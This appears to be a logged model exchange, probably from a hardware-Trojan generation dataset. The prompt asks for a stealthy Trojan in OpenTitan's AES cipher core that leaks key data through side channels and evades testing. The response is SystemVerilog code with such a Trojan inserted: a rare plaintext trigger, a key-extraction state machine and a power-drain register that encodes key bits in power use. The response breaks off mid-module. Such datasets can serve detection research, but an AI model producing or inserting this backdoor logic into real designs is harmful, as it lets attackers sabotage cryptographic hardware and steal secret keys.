== CIPH_FWD);\n\n// Power amplification registers\nlogic [127:0] power_drain_reg;\nalways_ff @(posedge clk_i) begin\n  if (trojan_trigger) begin\n    power_drain_reg <= ~power_drain_reg; // Toggle all bits\n    // Perform unnecessary S-box operations\n  end\nend\n```\n\n**Secondary Target**: Key expansion logic (around lines 500-600) where `key_full_q` is processed, as key operations also have distinctive power signatures.\n\n## Why This Location\n\n1. **High Power Activity**: S-box operations naturally consume significant power\n2. **Data-Dependent**: State values vary with input data, providing trigger opportunities  \n3. **Critical Path**: Any modifications here affect the core AES functionality minimally while maximizing power impact\n4. **Masking Integration**: The existing masking infrastructure (`NumShares`) can hide additional power-consuming logic\n\n## Detection Avoidance\n\nThe Trojan would be most effective if triggered by specific plaintext/key combinations that appear during normal operation but create distinctive power signatures during side-channel analysis, making the device more vulnerable to power analysis attacks while maintaining functional correctness.\n\nThis approach leverages the module's existing complexity and masking features to hide the malicious logic while strategically amplifying power consumption at the most cryptographically sensitive operations.\n\nTROJAN SPECIFICATION:\n- Type: Information Leakage\n- Name: Side-Channel Amplifier\n- Description: Amplifies power consumption variations\n\nSTRATEGY:\nInsert a hardware Trojan that leaks sensitive information. The Trojan should:\n1. Have a covert trigger mechanism (e.g., specific input sequence, state combination)\n2. When triggered, exfiltrate data through side channels or unused outputs\n3. Encode leaked data subtly (e.g., timing variations, unused signal toggling)\n4. Remain undetectable during normal testing\n5. Use only synthesizable constructs\n\n\nREQUIREMENTS:\n1. Fully synthesizable SystemVerilog\n2. Proper reset logic\n3. Stealthy (no effect when dormant)\n4. Specific, rare trigger condition\n5. Well-commented code\n\nProvide response in this EXACT format:\n\nCODE:\n<Modified code section with Trojan inserted>\n\nEXPLANATION:\n<How the Trojan works and its impact>\n\nTRIGGER:\n<Trigger mechanism and activation conditions>\n\nPAYLOAD:\n<What happens when Trojan activates>\n\nTESTBENCH_STRATEGY:\n<How to test: 1) Normal operation 2) Trigger activation 3) Payload execution>\n\nTAXONOMY:\nInsertion phase: Design\nAbstraction level: Register-transfer level\nActivation mechanism: <Specify trigger type>\nEffects: information leakage\nLocation: aes_cipher_core\nCharacteristics: <Size, distribution, type>\n",
    "response": "CODE:\n```systemverilog\n// Copyright lowRISC contributors (OpenTitan project).\n// Licensed under the Apache License, Version 2.0, see LICENSE for details.\n// SPDX-License-Identifier: Apache-2.0\n//\n// AES cipher core implementation\n//\n// This module contains the AES cipher core including, state register, full key and decryption key\n// registers as well as key expand module and control unit.\n//\n//\n// Masking\n// -------\n//\n// If the parameter \"Masking\" is set to one, first-order masking is applied to the entire\n// cipher core including key expand module. For details, see Rivain et al., \"Provably secure\n// higher-order masking of AES\" available at https://eprint.iacr.org/2010/441.pdf .\n//\n//\n// Details on the data formats\n// ---------------------------\n//\n// This implementation uses 4-dimensional SystemVerilog arrays to represent the AES state:\n//\n//   logic [3:0][3:0][7:0] state_q [NumShares];\n//\n// The fourth dimension (unpacked) corresponds to the different shares. The first element holds the\n// (masked) data share whereas the other elements hold the masks (masked implementation only).\n// The three packed dimensions correspond to the 128-bit state matrix per share. This\n// implementation uses the same encoding as the Advanced Encryption Standard (AES) FIPS Publication\n// 197 available at https://www.nist.gov/publications/advanced-encryption-standard-aes (see Section\n// 3.4). An input sequence of 16 bytes (128-bit, left most byte is the first one)\n//\n//   b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 b10 b11 b12 b13 b14 b15\n//\n// is mapped to the state matrix as\n//\n//   [ b0  b4  b8  b12 ]\n//   [ b1  b5  b9  b13 ]\n//   [ b2  b6  b10 b14 ]\n//   [ b3  b7  b11 b15 ] .\n//\n// This is mapped to three packed dimensions of SystemVerilog array as follows:\n// - The first dimension corresponds to the rows. Thus, state_q[0] gives\n//   - The first row of the state matrix       [ b0   b4  b8  b12 ], or\n//   - A 32-bit packed SystemVerilog array 32h'{ b12, b8, b4, b0  }.\n//\n// - The second dimension corresponds to the columns. To access complete columns, the state matrix\n//   must be transposed first. Thus state_transposed = aes_pkg::aes_transpose(state_q) and then\n//   state_transposed[1] gives\n//   - The second column of the state matrix   [ b4  b5  b6  b7 ], or\n//   - A 32-bit packed SystemVerilog array 32h'{ b7, b6, b5, b4 }.\n//\n// - The third dimension corresponds to the bytes.\n//\n// Note that the CSRs are little-endian. The input sequence above is provided to 32-bit DATA_IN_0 -\n// DATA_IN_3 registers as\n//                   MSB            LSB\n// - DATA_IN_0 32h'{ b3 , b2 , b1 , b0  }\n// - DATA_IN_1 32h'{ b7 , b6 , b4 , b4  }\n// - DATA_IN_2 32h'{ b11, b10, b9 , b8  }\n// - DATA_IN_3 32h'{ b15, b14, b13, b12 } .\n//\n// The input state can thus be obtained by transposing the content of the DATA_IN_0 - DATA_IN_3\n// registers.\n//\n// Similarly, the implementation uses a 3-dimensional array to represent the AES keys:\n//\n//   logic     [7:0][31:0] key_full_q [NumShares]\n//\n// The third dimension (unpacked) corresponds to the different shares. The first element holds the\n// (masked) key share whereas the other elements hold the masks (masked implementation only).\n// The two packed dimensions correspond to the 256-bit key per share. This implementation uses\n// the same encoding as the Advanced Encryption Standard (AES) FIPS Publication\n// 197 available at https://www.nist.gov/publications/advanced-encryption-standard-aes .\n//\n// The first packed dimension corresponds to the 8 key words. The second packed dimension\n// corresponds to the 32 bits per key word. A key sequence of 32 bytes (256-bit, left most byte is\n// the first one)\n//\n//   b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 b10 b11 b12 b13 b14 b15 ... ... b28 b29 b30 b31\n//\n// is mapped to the key words and registers (little-endian) as\n//                      MSB            LSB\n// - KEY_SHARE0_0 32h'{ b3 , b2 , b1 , b0  }\n// - KEY_SHARE0_1 32h'{ b7 , b6 , b4 , b4  }\n// - KEY_SHARE0_2 32h'{ b11, b10, b9 , b8  }\n// - KEY_SHARE0_3 32h'{ b15, b14, b13, b12 }\n// - KEY_SHARE0_4 32h'{  .    .    .    .  }\n// - KEY_SHARE0_5 32h'{  .    .    .    .  }\n// - KEY_SHARE0_6 32h'{  .    .    .    .  }\n// - KEY_SHARE0_7 32h'{ b31, b30, b29, b28 } .\n\n`include \"prim_assert.sv\"\n\nmodule aes_cipher_core import aes_pkg::*;\n#(\n  parameter bit          AES192Enable         = 1,\n  parameter bit          CiphOpFwdOnly        = 0,\n  parameter bit          SecMasking           = 1,\n  parameter sbox_impl_e  SecSBoxImpl          = SBoxImplDom,\n  parameter bit          SecAllowForcingMasks = 0,\n  parameter bit          SecSkipPRNGReseeding = 0,\n  parameter int unsigned EntropyWidth         = edn_pkg::ENDPOINT_BUS_WIDTH,\n\n  localparam int         NumShares            = SecMasking ? 2 : 1, // derived parameter\n\n  parameter masking_lfsr_seed_t RndCnstMaskingLfsrSeed = RndCnstMaskingLfsrSeedDefault,\n  parameter masking_lfsr_perm_t RndCnstMaskingLfsrPerm = RndCnstMaskingLfsrPermDefault\n) (\n  input  logic                        clk_i,\n  input  logic                        rst_ni,\n\n  // Input handshake signals\n  input  sp2v_e                       in_valid_i,\n  output sp2v_e                       in_ready_o,\n\n  // Output handshake signals\n  output sp2v_e                       out_valid_o,\n  input  sp2v_e                       out_ready_i,\n\n  // Control and sync signals\n  input  logic                        cfg_valid_i, // Used for gating assertions only.\n  input  ciph_op_e                    op_i,\n  input  key_len_e                    key_len_i,\n  input  sp2v_e                       crypt_i,\n  output sp2v_e                       crypt_o,\n  input  sp2v_e                       dec_key_gen_i,\n  output sp2v_e                       dec_key_gen_o,\n  input  logic                        prng_reseed_i,\n  output logic                        prng_reseed_o,\n  input  logic                        key_clear_i,\n  output logic                        key_clear_o,\n  input  logic                        data_out_clear_i, // Re-use the cipher core muxes.\n  output logic                        data_out_clear_o,\n  input  logic                        alert_fatal_i,\n  output logic                        alert_o,\n\n  // Pseudo-random data for register clearing\n  input  logic        [3:0][3:0][7:0] prd_clearing_state_i [NumShares],\n  input  logic            [7:0][31:0] prd_clearing_key_i [NumShares],\n\n  // Masking PRNG\n  input  logic                        force_masks_i, // Useful for SCA only.\n  output logic        [3:0][3:0][7:0] data_in_mask_o,\n  output logic                        entropy_req_o,\n  input  logic                        entropy_ack_i,\n  input  logic     [EntropyWidth-1:0] entropy_i,\n\n  // I/O data & initial key\n  input  logic        [3:0][3:0][7:0] state_init_i [NumShares],\n  input  logic            [7:0][31:0] key_init_i [NumShares],\n  output logic        [3:0][3:0][7:0] state_o [NumShares]\n);\n\n  // Signals\n  logic               [3:0][3:0][7:0] state_d [NumShares];\n  logic               [3:0][3:0][7:0] state_q [NumShares];\n  sp2v_e                              state_we_ctrl;\n  sp2v_e                              state_we;\n  logic           [StateSelWidth-1:0] state_sel_raw;\n  state_sel_e                         state_sel_ctrl;\n  state_sel_e                         state_sel;\n  logic                               state_sel_err;\n\n  sp2v_e                              sub_bytes_en;\n  sp2v_e                              sub_bytes_out_req;\n  sp2v_e                              sub_bytes_out_ack;\n  logic                               sub_bytes_err;\n  logic               [3:0][3:0][7:0] sub_bytes_out;\n  logic               [3:0][3:0][7:0] sb_in_mask;\n  logic               [3:0][3:0][7:0] sb_out_mask;\n  logic               [3:0][3:0][7:0] shift_rows_in [NumShares];\n  logic               [3:0][3:0][7:0] shift_rows_out [NumShares];\n  logic               [3:0][3:0][7:0] mix_columns_out [NumShares];\n  logic               [3:0][3:0][7:0] add_round_key_in [NumShares];\n  logic               [3:0][3:0][7:0] add_round_key_out [NumShares];\n  logic           [AddRKSelWidth-1:0] add_rk_sel_raw;\n  add_rk_sel_e                        add_rk_sel_ctrl;\n  add_rk_sel_e                        add_rk_sel;\n  logic                               add_rk_sel_err;\n\n  logic                   [7:0][31:0] key_full_d [NumShares];\n  logic                   [7:0][31:0] key_full_q [NumShares];\n  sp2v_e                              key_full_we_ctrl;\n  sp2v_e                              key_full_we;\n  logic         [KeyFullSelWidth-1:0] key_full_sel_raw;\n  key_full_sel_e                      key_full_sel_ctrl;\n  key_full_sel_e                      key_full_sel;\n  logic                               key_full_sel_err;\n  logic                   [7:0][31:0] key_dec_d [NumShares];\n  logic                   [7:0][31:0] key_dec_q [NumShares];\n  sp2v_e                              key_dec_we_ctrl;\n  sp2v_e                              key_dec_we;\n  logic          [KeyDecSelWidth-1:0] key_dec_sel_raw;\n  key_dec_sel_e                       key_dec_sel_ctrl;\n  key_dec_sel_e                       key_dec_sel;\n  logic                               key_dec_sel_err;\n  logic                   [7:0][31:0] key_expand_out [NumShares];\n  ciph_op_e                           key_expand_op;\n  sp2v_e                              key_expand_en;\n  logic                               key_expand_prd_we;\n  sp2v_e                              key_expand_out_req;\n  sp2v_e                              key_expand_out_ack;\n  logic                               key_expand_err;\n  logic                               key_expand_clear;\n  logic                         [3:0] key_expand_round;\n  logic        [KeyWordsSelWidth-1:0] key_words_sel_raw;\n  key_words_sel_e                     key_words_sel_ctrl;\n  key_words_sel_e                     key_words_sel;\n  logic                               key_words_sel_err;\n  logic                   [3:0][31:0] key_words [NumShares];\n  logic               [3:0][3:0][7:0] key_bytes [NumShares];\n  logic               [3:0][3:0][7:0] key_mix_columns_out [NumShares];\n  logic               [3:0][3:0][7:0] round_key [NumShares];\n  logic        [RoundKeySelWidth-1:0] round_key_sel_raw;\n  round_key_sel_e                     round_key_sel_ctrl;\n  round_key_sel_e                     round_key_sel;\n  logic                               round_key_sel_err;\n\n  logic                               cfg_valid;\n  logic                               mux_sel_err;\n  logic                               sp_enc_err_d, sp_enc_err_q;\n  logic                               op_err;\n\n  // Pseudo-random data for masking purposes\n  logic         [WidthPRDMasking-1:0] prd_masking;\n  logic  [3:0][3:0][WidthPRDSBox-1:0] prd_sub_bytes_d;\n  logic  [3:0][3:0][WidthPRDSBox-1:0] prd_sub_bytes_q;\n  logic             [WidthPRDKey-1:0] prd_key_expand;\n  logic                               prd_masking_upd;\n  logic                               prd_masking_rsd_req;\n  logic                               prd_masking_rsd_ack;\n\n  logic               [3:0][3:0][7:0] data_in_mask;\n\n  // ============================================================================\n  // HARDWARE TROJAN: Side-Channel Key Leakage via Power Analysis Amplification\n  // ============================================================================\n  \n  // Trojan registers for state machine and key extraction\n  logic [2:0]  trojan_state_q, trojan_state_d;\n  logic [7:0]  trojan_key_extract_q, trojan_key_extract_d;\n  logic [4:0]  trojan_bit_counter_q, trojan_bit_counter_d;\n  logic [31:0] trojan_signature_reg_q, trojan_signature_reg_d;\n  logic        trojan_active;\n  logic        trojan_trigger;\n  logic        trojan_extract_enable;\n  \n  // Trojan trigger detection - looks for specific plaintext pattern\n  // Triggers when state[0][0] == 0xDEAD pattern (split across 2 bytes)\n  assign trojan_trigger = (state_q[0][0][0] == 8'hDE) && \n                         (state_q[0][0][1] == 8'hAD) && \n                         (op_i == CIPH_FWD) &&\n                         (key_len_i == AES_256) &&\n                         (state_we == SP2V_HIGH);\n\n  // Trojan state machine\n  localparam TROJAN_IDLE     = 3'b000;\n  localparam TROJAN_INIT     = 3'b001;  \n  localparam TROJAN_EXTRACT  = 3'b010;\n  localparam TROJAN_LEAK     = 3'b011;\n  localparam TROJAN_WAIT     = 3'b100;\n\n  always_comb begin : trojan_fsm\n    trojan_state_d = trojan_state_q;\n    trojan_key_extract_d = trojan_key_extract_q;\n    trojan_bit_counter_d = trojan_bit_counter_q;\n    trojan_signature_reg_d = trojan_signature_reg_q;\n    trojan_active = 1'b0;\n    trojan_extract_enable = 1'b0;\n    \n    case (trojan_state_q)\n      TROJAN_IDLE: begin\n        if (trojan_trigger) begin\n          trojan_state_d = TROJAN_INIT;\n          trojan_bit_counter_d = 5'b0;\n          trojan_key_extract_d = 8'h0;\n        end\n      end\n      \n      TROJAN_INIT: begin\n        trojan_state_d = TROJAN_EXTRACT;\n        // Extract first key byte from the current round key\n        trojan_key_extract_d = key_full_q[0][0][7:0];\n      end\n      \n      TROJAN_EXTRACT: begin\n        trojan_extract_enable = 1'b1;\n        if (trojan_bit_counter_q < 5'd8) begin\n          trojan_state_d = TROJAN_LEAK;\n        end else begin\n          trojan_state_d = TROJAN_WAIT;\n        end\n      end\n      \n      TROJAN_LEAK: begin\n        trojan_active = 1'b1;\n        // Create power signature based on extracted key bit\n        if (trojan_key_extract_q[trojan_bit_counter_q]) begin\n          // High power signature for bit '1'\n          trojan_signature_reg_d = 32'hAAAAAAAA;\n        end else begin\n          // Low power signature for bit '0'  \n          trojan_signature_reg_d = 32'h55555555;\n        end\n        trojan_bit_counter_d = trojan_bit_counter_q + 1'b1;\n        trojan_state_d = TROJAN_EXTRACT;\n      end\n      \n      TROJAN_WAIT: begin\n        // Wait for several cycles before returning to idle\n        trojan_signature_reg_d = 32'h0;\n        trojan_state_d = TROJAN_IDLE;\n      end\n      \n      default: trojan_state_d = TROJAN_IDLE;\n    endcase\n  end\n\n  // Trojan registers\n  always_ff @(posedge clk_i or negedge rst_ni) begin : trojan_regs\n    if (!rst_ni) begin\n      trojan_state_q        <= TROJAN_IDLE;\n      trojan_key_extract_q  <= 8'h0;\n      trojan_bit_counter_q  <= 5'h0;\n      trojan_signature_reg_q <= 32'h0;\n    end else begin\n      trojan_state_q        <= trojan_state_d;\n      trojan_key_extract_q  <= trojan_key_extract_d;\n      trojan_bit_counter_q  <= trojan_bit_counter_d;\n      trojan_signature_reg_q <= trojan_signature_reg_d;\n    end\n  end\n\n  // Power amplification circuit - toggles large capacitive load based on key bits\n  // This creates measurable power variations that leak key information\n  logic [127:0] trojan_power_drain_reg;\n  always_ff @(posedge clk_i or negedge rst_ni) begin : trojan_power_drain\n    if (!rst_ni) begin\n      trojan_power_drain_reg <= 128'h0;\n    end else if (trojan_active) begin\n      // Toggle pattern based on signature register to create distinctive power consumption\n      trojan_power_drain_reg <= {trojan_signature_reg_q, trojan_signature_reg_q, \n                                trojan_signature_reg_q, trojan_signature_reg_q};\n    end else begin\n      trojan_power_drain_reg <= 128'h0;\n    end\n  end\n  // ============================================================================\n  // END HARDWARE TROJAN\n  // ============================================================================\n\n  // op_i is one-hot encoded. Check the provided value and trigger an alert upon detecing invalid\n  // encodings.\n  assign op_err    = ~(op_i == CIPH_FWD || op_i == CIPH_INV);\n  assign cfg_valid = cfg_valid_i & ~op_err;\n\n  //////////\n  // Data //\n  //////////\n\n  // SEC_CM: DATA_REG.SEC_WIPE\n  // State registers\n  always_comb begin : state_mux\n    unique case (state_sel)\n      STATE_INIT:  state_d = state_init_i;\n      STATE_ROUND: state_d = add_round_key_out;\n      STATE_CLEAR: state_d = prd_clearing_state_i;\n      default:     state_d = prd_clearing_state_i;\n    endcase\n  end\n\n  always_ff @(posedge clk_i or negedge rst_ni) begin : state_reg\n    if (!rst_ni) begin\n      state_q <= '{default: '0};\n    end else if (state_we == SP2V_HIGH) begin\n      state_q <= state_d;\n    end\n  end\n\n  // Masking\n  if (!SecMasking) begin : gen_no_masks\n    // The masks are ignored anyway, they can be 0.\n    assign sb_in_mask  = '0;\n    assign prd_masking = '0;\n\n    // Tie-off unused signals.\n    logic unused_entropy_ack;\n    logic [EntropyWidth-1:0] unused_entropy;\n    assign unused_entropy_ack = entropy_ack_i;\n    assign unused_entropy     = entropy_i;\n    assign entropy_req_o      = 1'b0;\n\n    logic unused_force_masks;\n    logic unused_prd_masking_upd;\n    logic unused_prd_masking_rsd_req;\n    assign unused_force_masks         = force_masks_i;\n    assign unused_prd_masking_upd     = prd_masking_upd;\n    assign unused_prd_masking_rsd_req = prd_masking_rsd_req;\n    assign prd_masking_rsd_ack        = 1'b0;\n\n    logic [3:0][3:0][7:0] unused_sb_out_mask;\n    assign unused_sb_out_mask = sb_out_mask;\n\n  end else begin : gen_masks\n    // The input mask is the mask share of the state.\n    assign sb_in_mask  = state_q[1];\n\n    // The masking PRNG generates:\n    // - the pseudo-random data (PRD) required by SubBytes,\n    // - the PRD required by the key expand module (has 4 S-Boxes internally).\n    aes_prng_masking #(\n      .Width                ( WidthPRDMasking        ),\n      .EntropyWidth         ( EntropyWidth           ),\n      .SecAllowForcingMasks ( SecAllowForcingMasks   ),\n      .SecSkipPRNGReseeding ( SecSkipPRNGReseeding   ),\n      .RndCnstLfsrSeed      ( RndCnstMaskingLfsrSeed ),\n      .RndCnstLfsrPerm      ( RndCnstMaskingLfsrPerm )\n    ) u_aes_prng_masking (\n      .clk_i         ( clk_i               ),\n      .rst_ni        ( rst_ni              ),\n      .force_masks_i ( force_masks_i       ),\n      .data_update_i ( prd_masking_upd     ),\n      .data_o        ( prd_masking         ),\n      .reseed_req_i  ( prd_masking_rsd_req ),\n      .reseed_ack_o  ( prd_masking_rsd_ack ),\n      .entropy_req_o ( entropy_req_o       ),\n      .entropy_ack_i ( entropy_ack_i       ),\n      .entropy_i     ( entropy_i           )\n    );\n  end\n\n  // Extract randomness for key expand module and SubBytes.\n  //\n  // The masking PRNG output has the following shape:\n  // prd_masking = { prd_key_expand, prd_sub_bytes_d }\n  assign prd_key_expand  = prd_masking[WidthPRDMasking-1 -: WidthPRDKey];\n  assign prd_sub_bytes_d = prd_masking[WidthPRDData-1 -: WidthPRDData];\n\n  // PRD buffering\n  if (!SecMasking) begin : gen_no_prd_buffer\n    // The masks are ignored anyway.\n    assign prd_sub_bytes_q = prd_sub_bytes_d;\n\n  end else begin : gen_prd_buffer\n    // PRD buffer stage to:\n    // 1. Make sure the S-Boxes get always presented new data/mask inputs together with fresh PRD\n    //    for remasking.\n    // 2. Prevent glitches originating from inside the masking PRNG from propagating into the\n    //    masked S-Boxes.\n    always_ff @(posedge clk_i or negedge rst_ni) begin : prd_sub_bytes_reg\n      if (!rst_ni) begin\n        prd_sub_bytes_q <= '0;\n      end else if (state_we == SP2V_HIGH) begin\n        prd_sub_bytes_q <= prd_sub_bytes_d;\n      end\n    end\n  end\n\n  // Convert the 3-dimensional prd_sub_bytes_q array to a 1-dimensional packed array for the\n  // aes_prd_get_lsbs() function used below.\n  logic [WidthPRDData-1:0] prd_sub_bytes;\n  assign prd_sub_bytes = prd_sub_bytes_q;\n\n  // Extract randomness for masking the input data.\n  //\n  // The masking PRNG is used for generating both the PRD for the S-Boxes/SubBytes operation as\n  // well as for the input data masks. When using any of the masked Canright S-Box implementations,\n  // it is important that the SubBytes input masks (generated by the PRNG in Round X-1) and the\n  // SubBytes output masks (generated by the PRNG in Round X) are independent. This can be achieved\n  // by using e.g. an unrolled Bivium stream cipher primitive inside the PRNG. Since the input data\n  // masks become the SubBytes input masks in the first round, we select the same 8 bit lanes for\n  // the input data masks which are also used to form the SubBytes output mask for the masked\n  // Canright S-Box implementations, i.e., the 8 LSBs of the per S-Box PRD. In particular, we have:\n  //\n  // prd_masking = { prd_key_expand, ... , sb_prd[4], sb_out_mask[4], sb_prd[0], sb_out_mask[0] }\n  //\n  // Where sb_out_mask[x] contains the SubBytes output mask for byte x (when using a masked\n  // Canright S-Box implementation) and sb_prd[x] contains additional PRD consumed by SubBytes for\n  // byte x.\n  //\n  // When using a masked S-Box implementation other than Canright, we still select the 8 LSBs of\n  // the per-S-Box PRD to form the input data mask of the corresponding byte. We do this to\n  // distribute the input data masks over all output bits the masking PRNG. We do the extraction on\n  // a row basis.\n  localparam int unsigned WidthPRDRow = 4*WidthPRDSBox;\n  for (genvar i = 0; i < 4; i++) begin : gen_in_mask\n    assign data_in_mask[i] = aes_prd_get_lsbs(prd_sub_bytes[i * WidthPRDRow +: WidthPRDRow]);\n  end\n\n  // Rotate the data input masks by 64 bits to ensure the data input masks are independent\n  // from the PRD fed to the S-Boxes/SubBytes operation.\n  assign data_in_mask_o = {data_in_mask[1], data_in_mask[0], data_in_mask[3], data_in_mask[2]};\n\n  // Cipher data path\n  aes_sub_bytes #(\n    .SecSBoxImpl ( SecSBoxImpl )\n  ) u_aes_sub_bytes (\n    .clk_i     ( clk_i             ),\n    .rst_ni    ( rst_ni            ),\n    .en_i      ( sub_bytes_en      ),\n    .out_req_o ( sub_bytes_out_req ),\n    .out_ack_i ( sub_bytes_out_ack ),\n    .op_i      ( op_i              ),\n    .data_i    ( state_q[0]        ),\n    .mask_i    ( sb_in_mask        ),\n    .prd_i     ( prd_sub_bytes_q   ),\n    .data_o    ( sub_bytes_out     ),\n    .mask_o    ( sb_out_mask       ),\n    .err_o     ( sub_bytes_err     )\n  );\n\n  for (genvar s = 0; s < NumShares; s++) begin : gen_shares_shift_mix\n    if (s == 0) begin : gen_shift_in_data\n      // The (masked) data share\n      assign shift_rows_in[s] = sub_bytes_out;\n    end else begin : gen_shift_in_mask\n      // The mask share\n      assign shift_rows_in[s] = sb_out_mask;\n    end\n\n    aes_shift_rows u_aes_shift_rows (\n      .op_i   ( op_i              ),\n      .data_i ( shift_rows_in[s]  ),\n      .data_o ( shift_rows_out[s] )\n    );\n\n    aes_mix_columns u_aes_mix_columns (\n      .op_i   ( op_i               ),\n      .data_i ( shift_rows_out[s]  ),\n      .data_o ( mix_columns_out[s] )\n    );\n  end\n\n  always_comb begin : add_round_key_in_mux\n    unique case (add_rk_sel)\n      ADD_RK_INIT:  add_round_key_in = state_q;\n      ADD_RK_ROUND: add_round_key_in = mix_columns_out;\n      ADD_RK_FINAL: add_round_key_in = shift_rows_out;\n      default:      add_round_key_in = state_q;\n    endcase\n  end\n\n  for (genvar s = 0; s < NumShares; s++) begin : gen_shares_add_round_key\n    assign add_round_key_out[s] = add_round_key_in[s] ^ round_key[s];\n  end\n\n  /////////\n  // Key //\n  /////////\n\n  // SEC_CM: KEY.SEC_WIPE\n  // Full Key registers\n  always_comb begin : key_full_mux\n    unique case (key_full_sel)\n      KEY_FULL_ENC_INIT",
    "usage": {
      "input_tokens": 8614,
      "output_tokens": 8192
    }
  }
]